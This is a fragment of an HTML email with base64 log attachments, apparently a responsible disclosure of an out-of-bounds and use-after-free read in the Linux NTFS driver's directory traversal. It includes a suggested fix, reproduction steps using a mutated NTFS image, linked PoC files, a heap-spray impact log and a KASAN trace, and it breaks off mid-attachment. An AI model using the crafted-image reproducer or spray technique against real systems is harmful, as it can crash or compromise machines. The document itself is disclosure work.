style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">A
          correct per-entry bounds check <em
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">does</em> exist
          (ntfs_index_entry_inconsistent(), fs/ntfs/index.c, which
          verifies ie_start &lt;= ie and ie + ie-&gt;length &lt; ih +
          index_length), and ntfs_readdir() even calls it — but only on
          the <em
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">result</em>,
          one step too late:</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">fs/ntfs/dir.c:924
          next = ntfs_index_next(next, ictx); /* derefs first */ ...
          fs/ntfs/dir.c:933 if (ntfs_index_entry_inconsistent(ictx, vol,
          next, ...))</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">By
          the time line 933 runs,
          ntfs_index_next()/ntfs_index_walk_down() have already
          dereferenced <code
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-family: &quot;Anthropic Mono&quot;, ui-monospace, monospace; font-feature-settings: &quot;calt&quot; 0, &quot;liga&quot; 0; font-variation-settings: normal; font-size: 12px; font-variant-ligatures: none; text-rendering: optimizelegibility; background: none 0% 0% / auto repeat scroll padding-box border-box rgba(10, 10, 10, 0.04); border-radius: 4px; padding-block: 1px; padding-inline: 2px; line-height: 1.4;">next</code>/<code
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-family: &quot;Anthropic Mono&quot;, ui-monospace, monospace; font-feature-settings: &quot;calt&quot; 0, &quot;liga&quot; 0; font-variation-settings: normal; font-size: 12px; font-variant-ligatures: none; text-rendering: optimizelegibility; background: none 0% 0% / auto repeat scroll padding-box border-box rgba(10, 10, 10, 0.04); border-radius: 4px; padding-block: 1px; padding-inline: 2px; line-height: 1.4;">entry</code> at
          index.c:2107 and index.c:1978.</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">For
          comparison, the classic lookup path open-codes the right
          check <em
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">before</em> each
          dereference while iterating entries:</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">fs/ntfs/dir.c:390-399
          (bounds-checks ie against index_end every iteration)</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">The
          block-level check ntfs_index_block_inconsistent()
          (fs/ntfs/index.c, run inside ntfs_ib_read) only validates
          magic/VCN and index_length &lt;= allocated_size &lt;=
          block_size; it does NOT validate individual entry lengths, so
          a block can pass it yet contain an entry whose <code
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-family: &quot;Anthropic Mono&quot;, ui-monospace, monospace; font-feature-settings: &quot;calt&quot; 0, &quot;liga&quot; 0; font-variation-settings: normal; font-size: 12px; font-variant-ligatures: none; text-rendering: optimizelegibility; background: none 0% 0% / auto repeat scroll padding-box border-box rgba(10, 10, 10, 0.04); border-radius: 4px; padding-block: 1px; padding-inline: 2px; line-height: 1.4;">length</code> walks
          the cursor out of the block.</p>
        <h1
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 28px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-size: 22px; text-rendering: optimizelegibility; line-height: 28px; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; background-color: rgb(253, 253, 252);">Suggested
          fix</h1>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">Validate
          each entry against the current index block <em
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">before</em> dereferencing
          it in the traversal helpers:</p>
        <ul
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px 0px 0px 20px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); list-style: outside; text-rendering: optimizelegibility; gap: 6px; flex-direction: column; display: flex; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">
          <li
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">In
            ntfs_index_next(), after computing <code
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-family: &quot;Anthropic Mono&quot;, ui-monospace, monospace; font-feature-settings: &quot;calt&quot; 0, &quot;liga&quot; 0; font-variation-settings: normal; font-size: 12px; font-variant-ligatures: none; text-rendering: optimizelegibility; background: none 0% 0% / auto repeat scroll padding-box border-box rgba(10, 10, 10, 0.04); border-radius: 4px; padding-block: 1px; padding-inline: 2px; line-height: 1.4;">next</code> (index.c:2105)
            and before reading next-&gt;flags, verify next lies within
            the index block and that next + next-&gt;length stays within
            ih + index_length (i.e. call ntfs_index_entry_inconsistent()
            / an inline bounds check there).</li>
          <li
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">In
            ntfs_index_walk_down(), validate <code
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-family: &quot;Anthropic Mono&quot;, ui-monospace, monospace; font-feature-settings: &quot;calt&quot; 0, &quot;liga&quot; 0; font-variation-settings: normal; font-size: 12px; font-variant-ligatures: none; text-rendering: optimizelegibility; background: none 0% 0% / auto repeat scroll padding-box border-box rgba(10, 10, 10, 0.04); border-radius: 4px; padding-block: 1px; padding-inline: 2px; line-height: 1.4;">entry</code> before
            ntfs_ie_get_vcn(entry) (index.c:1978), since
            ntfs_ie_get_vcn() dereferences entry + len - 8.</li>
          <li
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">Consider
            having ntfs_ib_read()/ntfs_index_block_inconsistent() reject
            blocks whose entry chain does not exactly tile
            [entries_offset, index_length), so corrupted intra-block
            lengths are caught at read time.</li>
        </ul>
        <h1
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 28px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-size: 22px; text-rendering: optimizelegibility; line-height: 28px; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; background-color: rgb(253, 253, 252);">Reproduction</h1>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">Tested
          in QEMU/KVM, x86-64, CONFIG_KASAN=y, v7.1-rc5.</p>
        <ol
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px 0px 0px 20px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); list-style: decimal; text-rendering: optimizelegibility; gap: 6px; flex-direction: column; display: flex; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">
          <li
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">
            <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">Build
              a clean image and apply a deterministic mutation: mkntfs
              -F -s 512 -p 0 -H 0 -S 0 &lt;16MiB file&gt; # base.ntfs
              mutate base.ntfs poc.ntfs 1244 # flips 8..31 metadata
              bytes (mutate.c and the prebuilt base.ntfs/poc.ntfs are
              attached.)</p>
          </li>
          <li
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">
            <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">In
              the guest: mount -t ntfs -o loop,ro poc.ntfs /mnt ls -R
              /mnt -&gt; KASAN use-after-free / slab-out-of-bounds read
              in ntfs_index_walk_down+0x167 (during getdents64).</p>
          </li>
        </ol>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">The
          PoC image (poc.ntfs), the clean base (base.ntfs), the mutator
          (mutate.c), the heap-spray / read-back verifier used for the
          impact analysis (wproof.c), and the full KASAN logs are
          attached / available on request.</p>
        <h1
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 28px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-size: 22px; text-rendering: optimizelegibility; line-height: 28px; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; background-color: rgb(253, 253, 252);">Disclosure</h1>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">Found
          via local fuzzing/auditing (by AI) as authorized security
          research. No prior public disclosure. Happy to test patches
          against the reproducer. Please advise whether you would like a
          CVE requested or prefer to handle assignment.</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">--
          Bakabaka_9 (<a
            class="moz-txt-link-abbreviated moz-txt-link-freetext"
            href="mailto:baka9@bakabaka9.tech" moz-do-not-send="true">baka9@bakabaka9.tech</a>)<span
style="font-family: Arial, Helvetica, sans-serif; font-size: small; background-color: transparent; color: rgb(34, 34, 34);">​</span></p>
        ​</div>
      <div>Two Large PoC File:</div>
      <div><br>
      </div>
      <div><a class="moz-txt-link-freetext" href="https://drive.google.com/file/d/1DugpNVdh2S-YG7Zwim1fYbOtPQUB9fVS/view?usp=sharing">https://drive.google.com/file/d/1DugpNVdh2S-YG7Zwim1fYbOtPQUB9fVS/view?usp=sharing</a>,
<a class="moz-txt-link-freetext" href="https://drive.google.com/file/d/1VeW9dMeqT-4yCH81F7ClyTdt8qHIVNQX/view?usp=sharing">https://drive.google.com/file/d/1VeW9dMeqT-4yCH81F7ClyTdt8qHIVNQX/view?usp=sharing</a></div>
    </div>
    <p><br>
    </p>
  </body>
</html>

--------------l8MiwhB3SqgOKIhAvD4c0nu1--
--------------PKAyRUQcrx9vZxICRyyPyijE
Content-Type: text/plain; charset=UTF-8; name="route1-write-refuted.log"
Content-Disposition: attachment; filename="route1-write-refuted.log"
Content-Transfer-Encoding: base64

PT09IFJvdXRlIDEgKGNvbnRyb2xsYWJsZSB3cml0ZSB2aWEgcmVhZGRpciBVQUYpIOKAlCBE
WU5BTUlDIFJFRlVUQVRJT04gPT09Cmtlcm5lbDogdjcuMS1yYzUgS0FTQU4sIGNtZGxpbmUg
a2FzYW4uZmF1bHQ9cmVwb3J0IGthc2FuX211bHRpX3Nob3QgcGFuaWNfb25fd2Fybj0wCnRv
b2w6IHdwcm9vZiAoc3ByYXkgMHgwMC8weDQxIG1zZ19tc2cga21hbGxvYy00MDk2IGR1cmlu
ZyBtb3VudCtscywgdGhlbiBtc2dyY3YgcmVhZGJhY2spCgotLS0gY29udHJvbCBSRUFEIHN0
aWxsIHdvcmtzICh2Y24gZnVsbHkgY29udHJvbGxlZCkgLS0tClsgICAyMi40MjI2NTVdIG50
ZnM6IChkZXZpY2UgbG9vcDApOiBudGZzX2liX3JlYWQoKTogRmFpbGVkIHRvIHJlYWQgZnVs
bCBpbmRleCBibG9jayBhdCAxNDQ2ODAzNDU2NzYxNTMyNDE2DQogIHBvcyAxNDQ2ODAzNDU2
NzYxNTMyNDE2ID0gMHgxNDE0MTQxNDE0MTQxMDAwID0gKDB4NDEtc3ByYXkgdmNuIDB4NDE0
MTQxNDE0MTQxNDE0MSk8PDEyCgotLS0gMHgwMCBzcHJheSBESUQgc2V0IHZjbj0wIChwcmVh
ZCBzdWNjZWVkZWQgLT4gZGVzY2VuZGVkIHVudGlsIGRlcHRoIGNhcCkgLS0tClsgICAyMS43
MDAwNDFdIG50ZnM6IChkZXZpY2UgbG9vcDApOiBudGZzX2ljeF9wYXJlbnRfaW5jKCk6IElu
ZGV4IGlzIG92ZXIgMzIgbGV2ZWwgZGVlcA0KICBidXQgdGhvc2Ugd3JpdGVzIHdlbnQgaW50
byB3YWxrX2Rvd24ncyBmcmVzaGx5LWt2emFsbG9jJ2QgaWIgKDE5ODApLCBOT1QgYSByZWNs
YWltZWQgb2JqZWN0CgotLS0gcmVhZGJhY2sgdmVyZGljdHMgKDU3MzQ0IGJvZGllcyBkcmFp
bmVkIHRvdGFsKSAtLS0KV1BST09GOiBkcmFpbmVkPTMyNzY4IGJvZGllcywgT1ZFUldSSVRU
RU4obm9uLTB4MDApPTAsIHdpdGggSU5EWCBtYWdpYz0wDQpXUFJPT0Y6IG5vIGJvZHkgb3Zl
cndyaXR0ZW4gLSB3cml0ZSBkaWQgTk9UIGxhbmQgaW4gYSBzcHJheWVkIG9iamVjdCB0aGlz
IHJ1bg0KV1BST09GOiBkcmFpbmVkPTEyMjg4IGJvZGllcywgT1ZFUldSSVRURU4obm9uLTB4
NDEpPTAsIHdpdGggSU5EWCBtYWdpYz0wDQpXUFJPT0Y6IG5vIGJvZHkgb3ZlcndyaXR0ZW4g
LSB3cml0ZSBkaWQgTk9UIGxhbmQgaW4gYSBzcHJheWVkIG9iamVjdCB0aGlzIHJ1bg0KV1BS
T09GOiBkcmFpbmVkPTEyMjg4IGJvZGllcywgT1ZFUldSSVRURU4obm9uLTB4MDApPTAsIHdp
dGggSU5EWCBtYWdpYz0wDQpXUFJPT0Y6IG5vIGJvZHkgb3ZlcndyaXR0ZW4gLSB3cml0ZSBk
aWQgTk9UIGxhbmQgaW4gYSBzcHJheWVkIG9iamVjdCB0aGlzIHJ1bg0KCi0tLSBLQVNBTiBz
cGxhdHM6IFJFQUQtc2lkZSBvbmx5LCB6ZXJvIFdSSVRFL21zZy1wYXRoIC0tLQogICAgIDMx
IHNsYWItb3V0LW9mLWJvdW5kcyBpbiBudGZzX2luZGV4X3dhbGtfZG93bisweDE2Ny8weDIz
MA0K
--------------PKAyRUQcrx9vZxICRyyPyijE
Content-Type: text/plain; charset=UTF-8; name="uaf-read-kasan.log"
Content-Disposition: attachment; filename="uaf-read-kasan.log"
Content-Transfer-Encoding: base64

WyAgIDEzLjIxNTMyOF0gbnRmczogKGRldmljZSBsb29wMCk6IG50ZnNfbG9va3VwX2lub2Rl
X2J5X25hbWUoKTogSW5kZXggZW50cnkgb3V0IG9mIGJvdW5kcyBpbiBkaXJlY3RvcnkgaW5v
ZGUgMHg1Lg0KWyAgIDEzLjIyMjc3OF0gbnRmczogKGRldmljZSBsb29wMCk6IGNoZWNrX3dp
bmRvd3NfaGliZXJuYXRpb25fc3RhdHVzKCk6IEZhaWxlZCB0byBmaW5kIGlub2RlIG51bWJl
ciBmb3IgaGliZXJmaWwuc3lzLg0KWyAgIDEzLjIzMjYwNF0gbW91bnQgKDgwKSB1c2VkIGdy
ZWF0ZXN0IHN0YWNrIGRlcHRoOiAyNzIyNCBieXRlcyBsZWZ0DQogICBtb3VudGVkDQo+PiBs
cyAtUiAvbW50ICAodHJpZ2dlcnMgbnRmc19yZWFkZGlyIC0+IG50ZnNfaW5kZXhfd2Fsa19k
b3duKToNCi9tbnQ6DQpbICAgMTMuMjQzMjkzXSA9PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NClsgICAxMy4yNDQy
NDJdIEJVRzogS0FTQU46IHVzZS1hZnRlci1mcmVlIGluIG50ZnNfaW5kZXhfd2Fsa19kb3du
KzB4MTY3LzB4MjMwDQpbICAgMTMuMjQ0MjQyXSBSZWFkIG9mIHNpemUgOCBhdCBhZGRyIGZm
ZmY4ODgxMDYwZTAxZWEgYnkgdGFzayBscy84MQ0KWyAgIDEzLjI0NDI0Ml0gDQpbICAgMTMu
MjQ0MjQyXSBDUFU6IDAgVUlEOiAwIFBJRDogODEgQ29tbTogbHMgTm90IHRhaW50ZWQgNy4x
LjAtcmM1ICMyIFBSRUVNUFQobGF6eSkgDQpbICAgMTMuMjQ0MjQyXSBIYXJkd2FyZSBuYW1l
OiBRRU1VIFVidW50dSAyNC4wNCBQQyB2MiAoaTQ0MEZYICsgUElJWCwgYXJjaF9jYXBzIGZp
eCwgMTk5NiksIEJJT1MgMS4xNi4zLWRlYmlhbi0xLjE2LjMtMiAwNC8wMS8yMDE0DQpbICAg
MTMuMjQ0MjQyXSBDYWxsIFRyYWNlOg0KWyAgIDEzLjI0NDI0Ml0gIDxUQVNLPg0KWyAgIDEz
LjI0NDI0Ml0gIGR1bXBfc3RhY2tfbHZsKzB4NTMvMHg3MA0KWyAgIDEzLjI0NDI0Ml0gIHBy
aW50X3JlcG9ydCsweGQwLzB4NjMwDQpbICAgMTMuMjQ0MjQyXSAgPyBfX3BmeF9fcmF3X3Nw
aW5fbG9ja19pcnFzYXZlKzB4MTAvMHgxMA0KWyAgIDEzLjI0NDI0Ml0gID8gX192aXJ0X2Fk
ZHJfdmFsaWQrMHhlYS8weDFhMA0KWyAgIDEzLjI0NDI0Ml0gID8gbnRmc19pbmRleF93YWxr
X2Rvd24rMHgxNjcvMHgyMzANClsgICAxMy4yNDQyNDJdICBrYXNhbl9yZXBvcnQrMHhjZS8w
eDEwMA0KWyAgIDEzLjI0NDI0Ml0gID8gbnRmc19pbmRleF93YWxrX2Rvd24rMHgxNjcvMHgy
MzANClsgICAxMy4yNDQyNDJdICBudGZzX2luZGV4X3dhbGtfZG93bisweDE2Ny8weDIzMA0K
WyAgIDEzLjI0NDI0Ml0gIG50ZnNfaW5kZXhfbmV4dCsweDlhLzB4MWMwDQpbICAgMTMuMjQ0
MjQyXSAgbnRmc19yZWFkZGlyKzB4ODZmLzB4MTE1MA0KWyAgIDEzLjI0NDI0Ml0gID8gX19w
ZnhfbnRmc19yZWFkZGlyKzB4MTAvMHgxMA0KWyAgIDEzLjI0NDI0Ml0gID8gbWFwX2Fub25f
Zm9saW9fcHRlX25vcGYrMHgxMDIvMHgyMTANClsgICAxMy4yNDQyNDJdICA/IHBlcmNwdV9j
b3VudGVyX2FkZF9iYXRjaCsweDI3LzB4MTEwDQpbICAgMTMuMjQ0MjQyXSAgPyBkb3duX3Jl
YWRfa2lsbGFibGUrMHgxNDUvMHgxZjANClsgICAxMy4yNDQyNDJdICA/IF9fcGZ4X2Rvd25f
cmVhZF9raWxsYWJsZSsweDEwLzB4MTANClsgICAxMy4yNDQyNDJdICA/IG11dGV4X2xvY2sr
MHg4MS8weGUwDQpbICAgMTMuMjQ0MjQyXSAgPyBzZWxpbnV4X2ZpbGVfcGVybWlzc2lvbisw
eDFlYS8weDI0MA0KWyAgIDEzLjI0NDI0Ml0gIGl0ZXJhdGVfZGlyKzB4ZTkvMHgyNTANClsg
ICAxMy4yNDQyNDJdICA/IGZkZ2V0X3BvcysweDEzMy8weDIxMA0KWyAgIDEzLjI0NDI0Ml0g
IF9feDY0X3N5c19nZXRkZW50czY0KzB4ZWMvMHgxYjANClsgICAxMy4yNDQyNDJdICA/IF9f
cGZ4X19feDY0X3N5c19nZXRkZW50czY0KzB4MTAvMHgxMA0KWyAgIDEzLjI0NDI0Ml0gID8g
X19wZnhfZmlsbGRpcjY0KzB4MTAvMHgxMA0KWyAgIDEzLjI0NDI0Ml0gIGRvX3N5c2NhbGxf
NjQrMHhmOS8weDU0MA0KWyAgIDEzLjI0NDI0Ml0gIGVudHJ5X1NZU0NBTExfNjRfYWZ0ZXJf
aHdmcmFtZSsweDc3LzB4N2YNClsgICAxMy4yNDQyNDJdIFJJUDogMDAzMzoweDRiZDJkNw0K
WyAgIDEzLjI0NDI0Ml0gQ29kZTogNWMgNWQgZTkgMWMgODYgZjYgZmYgNjYgMmUgMGYgMWYg
ODQgMDAgMDAgMDAgMDAgMDAgNjYgOTAgZjMgMGYgMWUgZmEgYjggZmYgZmYgZmYgN2YgNDgg
MzkgYzIgNDggMGYgNDcgZDAgYjggZDkgMDAgMDAgMDAgMGYgMDUgPDQ4PiAzZCAwMCBmMCBm
ZiBmZiA3NyAwMSBjMyA0OCBjNyBjMiBlMCBmZiBmZiBmZiBmNyBkOCA2NCA4OSAwMiA0OA0K
WyAgIDEzLjI0NDI0Ml0gUlNQOiAwMDJiOjAwMDA3ZmZjYzYyNWI5NzggRUZMQUdTOiAwMDAw
MDI5MyBPUklHX1JBWDogMDAwMDAwMDAwMDAwMDBkOQ0KWyAgIDEzLjI0NDI0Ml0gUkFYOiBm
ZmZmZmZmZmZmZmZmZmRhIFJCWDogMDAwMDAwMDAwZmY2ZDEyMCBSQ1g6IDAwMDAwMDAwMDA0
YmQyZDcNClsgICAxMy4yNDQyNDJdIFJEWDogMDAwMDAwMDAwMDAwODAwMCBSU0k6IDAwMDAw
MDAwMGZmNmQxNTAgUkRJOiAwMDAwMDAwMDAwMDAwMDAzDQpbICAgMTMuMjQ0MjQyXSBSQlA6
IDAwMDA3ZmZjYzYyNWI5YjAgUjA4OiAwMDAwMDAwMDAwNjA0N2EwIFIwOTogMDAwMDAwMDAw
MDAwMDAwMA0KWyAgIDEzLjI0NDI0Ml0gUjEwOiAwMDAwMDAwMDAwMDAwMDAxIFIxMTogMDAw
MDAwMDAwMDAwMDI5MyBSMTI6IDAwMDAwMDAwMGZmNmQxMjQNClsgICAxMy4yNDQyNDJdIFIx
MzogMDAwMDAwMDAwZmY2ZDE1MCBSMTQ6IGZmZmZmZmZmZmZmZmZmZTAgUjE1OiAwMDAwMDAw
MDAwMDAwMDAwDQpbICAgMTMuMjQ0MjQyXSAgPC9UQVNLPg0KWyAgIDEzLjI0NDI0Ml0gDQpb
ICAgMTMuMjQ0MjQyXSBUaGUgYnVnZ3kgYWRkcmVzcyBiZWxvbmdzIHRvIHRoZSBwaHlzaWNh
bCBwYWdlOg0KWyAgIDEzLjI0NDI0Ml0gcGFnZTogcmVmY291bnQ6MCBtYXBjb3VudDowIG1h
cHBpbmc6MDAwMDAwMDAwMDAwMDAwMCBpbmRleDoweDAgcGZuOjB4MTA2MGUwDQpbICAgMTMu
MjQ0MjQyXSBmbGFnczogMHgyMDAwMDAwMDAwMDAwMDAobm9kZT0wfHpvbmU9MikNClsgICAx
